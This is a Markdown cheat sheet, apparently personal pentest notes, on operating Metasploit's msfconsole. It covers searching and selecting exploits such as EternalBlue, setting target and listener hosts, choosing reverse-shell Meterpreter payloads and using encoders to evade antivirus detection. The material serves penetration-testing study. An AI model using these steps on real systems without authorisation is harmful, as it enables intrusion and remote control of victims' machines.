---
id: Metasploit
aliases: ["msfconsole"]
tags:
  - Pentest/Tools/Metasploit/Metasploit
---

# Metasploit

[Metasploit](https://www.metasploit.com/)
is a Ruby-based, modular penetration testing framework

The MSF engagement structure can be divided into five main categories

- Enumeration
- Preparation
- Exploitation
- Privilege Escalation
- Post-Exploitation

<!-- Info {{{-->
> [!info]-
>
> ![[engagement-structure.png]]
<!-- }}} -->

___

<!-- Install & Update {{{-->
## Install & Update

Install the [Metasploit Framework](https://www.kali.org/tools/metasploit-framework/)

```sh
sudo apt update && sudo apt install metasploit-framework
```

___
<!-- }}} -->

<!-- Usage {{{-->
## Usage

<!-- Launch {{{-->
### Launch

Launch the [Msfconsole](https://www.offsec.com/metasploit-unleashed/msfconsole/)
(*MetaSploit Framework Console*)

```sh
msfconsole
```

```sh
msfconsole -q
```

<!-- Info {{{-->
> [!info]-
>
> - `-q`: Suppress launch banner
<!-- }}} -->

<!-- }}} -->

<!-- Modules {{{-->
### Modules

[Metasploit modules](https://docs.metasploit.com/docs/modules.html)
are prepared scripts with a specific purpose

<!-- Module Types {{{-->
> [!info]- Module Types
>
> | Type | Description
> | --- | --- |
> | Auxiliary | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality |
> | Encoders | Ensure that payloads are intact to their destination |
> | Exploits | Defined as modules that exploit a vulnerability that will allow for the payload delivery |
> | NOPs | (No Operation code) Keep the payload sizes consistent across exploit attempts |
> | Payloads | Code runs remotely and calls back to the attacker machine to establish a connection (or shell) |
> | Plugins | Additional scripts can be integrated within an assessment with msfconsole and coexist |
> | Post | Wide array of modules to gather information, pivot deeper, etc |
<!-- }}} -->

<!-- Search {{{-->
#### Search

Search modules, exploits, and scanners

```sh
search <module>
```

Filter search findings

```sh
search type:<type> name:<name>
```

<!-- Info {{{-->
> [!info]-
>
> Search modules using keywords and tags
>
> ```sh
> msf6 > help search
> ```
> ```
> Usage: search [<options>] [<keywords>:<value>]
>
> Prepending a value with '-' will exclude any matching results.
> If no options or keywords are provided, cached results are displayed.
>
> OPTIONS:
>   -h                   Show this help information
>   -o <file>            Send output to a file in csv format
>   -S <string>          Regex pattern used to filter search results
>   -u                   Use module if there is one result
>   -s <search_column>   Sort the research results based on <search_column> in ascending order
>   -r                   Reverse the search results order to descending order
>
> Keywords:
>   aka              :  Modules with a matching AKA (also-known-as) name
>   author           :  Modules written by this author
>   arch             :  Modules affecting this architecture
>   bid              :  Modules with a matching Bugtraq ID
>   cve              :  Modules with a matching CVE ID
>   edb              :  Modules with a matching Exploit-DB ID
>   check            :  Modules that support the 'check' method
>   date             :  Modules with a matching disclosure date
>   description      :  Modules with a matching description
>   fullname         :  Modules with a matching full name
>   mod_time         :  Modules with a matching modification date
>   name             :  Modules with a matching descriptive name
>   path             :  Modules with a matching path
>   platform         :  Modules affecting this platform
>   port             :  Modules with a matching port
>   rank             :  Modules with a matching rank (Can be descriptive (ex: 'good') or numeric with comparison operators (ex: 'gte400'))
>   ref              :  Modules with a matching ref
>   reference        :  Modules with a matching reference
>   target           :  Modules affecting this target
>   type             :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)
>
> Supported search columns:
>   rank             :  Sort modules by their exploitabilty rank
>   date             :  Sort modules by their disclosure date. Alias for disclosure_date
>   disclosure_date  :  Sort modules by their disclosure date
>   name             :  Sort modules by their name
>   type             :  Sort modules by their type
>   check            :  Sort modules by whether or not they have a check method
>
> Examples:
>   search cve:2009 type:exploit
>   search cve:2009 type:exploit platform:-linux
>   search cve:2009 -s name
>   search type:exploit -s type -r
> ```
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> search type:auxiliary name:mssql
> ```
> ```sh
> search type:auxiliary scanner mssql
> ```
> ```sh
> search eternalromance
> ```
> ```sh
> search eternalromance type:exploit
> ```
> ```sh
> search type:exploit platform:windows cve:2021 rank:excellent microsoft
> ```
<!-- }}} -->


<!-- }}} -->

<!-- Example {{{-->
#### Example

[Generic Payload Handler](https://www.rapid7.com/db/modules/exploit/multi/handler/) -
Capture reverse [[Meterpreter]] shell

```sh
use exploit/multi/handler
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
>
> ```
<!-- }}} -->

[Multi Recon Local Exploit Suggester](https://www.rapid7.com/db/modules/post/multi/recon/local_exploit_suggester/) -
Privilege escalation exploit suggester

```sh
use post/multi/recon/local_exploit_suggester
```

<!-- Info {{{-->
> [!info]-
>
> This module suggests local Metasploit exploits that can be used.
>
> The exploits are suggested based on the architecture and platform
> that the user has a shell opened as well as the available exploits
> in meterpreter.
>
> It's important to note that not all local exploits will be fired.
> Exploits are chosen based on these conditions: session type,
> platform, architecture, and required default options
>
> [Rapid7 - Metasploit Local Exploit Suggester: Do Less, Get More!](https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)
<!-- }}} -->

<!-- }}} -->

<!-- Select {{{-->
#### Select

Select the module, exploit, or scanner

```sh
use <id>
```

```sh
use <module>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> use exploit/windows/smb/ms17_010_eternalblue
> ```
<!-- }}} -->

Unselect the module, exploit or scanner

```sh
back
```

<!-- }}} -->

<!-- Info {{{-->
#### Info

Show module info

```sh
info
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf exploit(multi/handler) > info
> ```
> ```sh
>       Name: Generic Payload Handler
>     Module: exploit/multi/handler
>   Platform: Android, Apple_iOS, BSD, Java, JavaScript, Linux, OSX, NodeJS, PHP, Python, Ruby, Solaris, Unix, Windows, Mainframe, Multi
>       Arch: x86, x86_64, x64, mips, mipsle, mipsbe, mips64, mips64le, ppc, ppce500v2, ppc64, ppc64le, cbea, cbea64, sparc, sparc64, armle, armbe, aarch64, cmd, php, tty, java, ruby, dalvik, python, nodejs, firefox, zarch, r, riscv32be, riscv32le, riscv64be, riscv64le, loongarch64
> Privileged: No
>    License: Metasploit Framework License (BSD)
>       Rank: Manual
>
> ...
> ```
<!-- }}} -->

<!-- }}} -->

<!-- }}} -->

<!-- Options {{{-->
#### Options

Set the required options for the selected module

<!-- General {{{-->
##### General

Show module options

<!-- Tip {{{-->
> [!tip]
>
> Any option with `Required` set to `yes` needs to be set
<!-- }}} -->

```sh
options
```

```sh
show options
```

```sh
advanced
```

```sh
show advanced
```

Show missing options

```sh
show missing
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf exploit(multi/handler) > show missing
> ```
> ```sh
> Payload options (generic/shell_reverse_tcp):
>
>    Name   Current Setting  Required  Description
>    ----   ---------------  --------  -----------
>    LHOST                   yes       The listen address (an interface may be specified)
> ```
>
<!-- }}} -->

Set module option

```sh
set <option> <value>
```

<!-- Example {{{-->
> [!example]-
>
> Set Local Host
>
> ```sh
> msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
> ```
> ```sh
> LHOST => 10.10.14.7
> ```
>
> Set Remote Host
>
> ```sh
> msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
> ```
> ```sh
> RHOSTS => 10.10.10.40
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Actions {{{-->
##### Actions

Actions are module-specific execution modes that change
what the exploit does, not how itâ€™s delivered
(*e.g. `Exploit`, `Check`, `Dump`, `Execute`*)

Show Actions

```sh
show actions
```

Set Actions

```sh
set ACTION <action_name>
```

<!-- }}} -->

<!-- Targets {{{-->
##### Targets

Targets are unique operating system identifiers
supported by the selected exploit

Show Targets

```sh
show targets
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets
> ```
> ```sh
> Exploit targets:
>
>    Id  Name
>    --  ----
>    0   Automatic
>    1   IE 7 on Windows XP SP3
>    2   IE 8 on Windows XP SP3
>    3   IE 7 on Windows Vista
>    4   IE 8 on Windows Vista
>    5   IE 8 on Windows 7
>    6   IE 9 on Windows 7
> ```
<!-- }}} -->

Set Target

```sh
set target <id>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets
> ```
> ```sh
> Exploit targets:
>
>    Id  Name
>    --  ----
>    0   Automatic
>    1   IE 7 on Windows XP SP3
>    2   IE 8 on Windows XP SP3
>    3   IE 7 on Windows Vista
>    4   IE 8 on Windows Vista
>    5   IE 8 on Windows 7
>    6   IE 9 on Windows 7
> ```
> ```sh
> msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6
> ```
> ```
> target => 6
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Payloads {{{-->
##### Payloads

[Payloads](https://www.offsec.com/metasploit-unleashed/payloads/)
are exploit modules that are used to (*typically*) return a shell

<!-- Payload Types {{{-->
> [!info]- Payload Types
>
> - [Singles](https://www.offsec.com/metasploit-unleashed/payloads/#singles)
> are payloads that are self-contained and completely standalone
> (*e.g., add a user to the target system, run `calc.exe`*)
>
> - [Stagers](https://www.offsec.com/metasploit-unleashed/payloads/#stagers)
> setup a network connection between the attacker and victim
> and are designed to be small and reliable
>
> - [Stages](https://www.offsec.com/metasploit-unleashed/payloads/#stages)
> are payload components that are downloaded by Stagers modules
<!-- }}} -->

<!-- Payloads {{{-->
> [!info]- Payloads
>
> Most common payloads for Windows machines
>
> | Payload | Description |
> | --- | --- |
> | `generic/custom` | Generic listener, multi-use |
> | `generic/shell_bind_tcp` | Generic listener, multi-use, normal shell, TCP connection binding |
> | `generic/shell_reverse_tcp` | Generic listener, multi-use, normal shell, reverse TCP connection |
> | `windows/x64/exec` | Executes an arbitrary command (Windows x64) |
> | `windows/x64/loadlibrary` | Loads an arbitrary x64 library path |
> | `windows/x64/messagebox` | Spawns a dialog via MessageBox using a customizable title, text & icon |
> | `windows/x64/shell_reverse_tcp` | Normal shell, single payload, reverse TCP connection |
> | `windows/x64/shell/reverse_tcp` | Normal shell, stager + stage, reverse TCP connection |
> | `windows/x64/shell/bind_ipv6_tcp` | Normal shell, stager + stage, IPv6 Bind TCP stager |
> | `windows/x64/meterpreter/$` | Meterpreter payload + varieties above |
> | `windows/x64/powershell/$` | Interactive PowerShell sessions + varieties above |
> | `windows/x64/vncinject/$` | VNC Server (Reflective Injection) + varieties above |
<!-- }}} -->

Show Payloads

```sh
show payloads
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf6 > show payloads
> ```
>
> ```sh
> <SNIP>
>
> 535  windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
> 536  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
> 537  windows/x64/meterpreter/bind_named_pipe                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
> 538  windows/x64/meterpreter/bind_tcp                                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
> 539  windows/x64/meterpreter/bind_tcp_rc4                                 normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
> 540  windows/x64/meterpreter/bind_tcp_uuid                                normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
> 541  windows/x64/meterpreter/reverse_http                                 normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
> 542  windows/x64/meterpreter/reverse_https                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
> 543  windows/x64/meterpreter/reverse_named_pipe                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
> 544  windows/x64/meterpreter/reverse_tcp                                  normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
> 545  windows/x64/meterpreter/reverse_tcp_rc4                              normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
> 546  windows/x64/meterpreter/reverse_tcp_uuid                             normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
> 547  windows/x64/meterpreter/reverse_winhttp                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
> 548  windows/x64/meterpreter/reverse_winhttps                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
>
> <SNIP>
> ```
<!-- }}} -->

Filter Payloads

```sh
show payloads platform=linux
```

```sh
show payloads platform=windows
```

```sh
grep meterpreter show payloads
```

```sh
grep meterpreter grep reverse_tcp show payloads
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf6 > show payloads
> ```
> ```sh
> msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads
>
>    6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
>    7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
>    8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
>    9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
>    10  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
>    11  payload/windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
>    12  payload/windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
>    13  payload/windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
>    14  payload/windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
>    15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
>    16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
>    17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
>    18  payload/windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
>    19  payload/windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
> ```
> ```sh
> msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloads
> ```
> ```
> [*] 14
> ```
<!-- }}} -->

Set Payload

```sh
set payload <id>
```

```sh
set payload <payload>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> set payload generic/shell_reverse_tcp
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Encoders {{{-->
##### Encoders

Encoders changing the [[#Payloads]] to run on different operating systems
and architectures and help with AV and IDS/IPS detection

Show available encoders

```sh
show encoders
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15
> ```
> ```sh
> payload => windows/x64/meterpreter/reverse_tcp
> ```
> ```sh
> msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders
> ```
> ```sh
> Compatible Encoders
> ===================
>
>    #  Name              Disclosure Date  Rank    Check  Description
>    -  ----              ---------------  ----    -----  -----------
>    0  generic/eicar                      manual  No     The EICAR Encoder
>    1  generic/none                       manual  No     The "none" Encoder
>    2  x64/xor                            manual  No     XOR Encoder
>    3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
>    4  x64/zutto_dekiru                   manual  No     Zutto Dekiru
> ```
<!-- }}} -->

Set encoder

```sh
set ENCODER <name>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> set ENCODER x64/xor
> ```
<!-- }}} -->

Set encoder iterations

```sh
set ENCODER_ITERATIONS <id>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> set ENCODER_ITERATIONS <no>
> ```
<!-- }}} -->

<!-- }}} -->

<!-- }}} -->

<!-- Check {{{-->
#### Check

Check if the target is vulnerable to the exploit

<!-- Warning {{{-->
> [!warning]
>
> Not every exploit supports the `check` function
<!-- }}} -->

```sh
check
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> check
> ```
> ```sh
> [+] Target is vulnerable.
> ```
<!-- }}} -->


<!-- }}} -->

<!-- Run {{{-->
#### Run

Launch the module/exploit

```sh
run
```

```sh
exploit
```

<!-- }}} -->

___
<!-- }}} -->
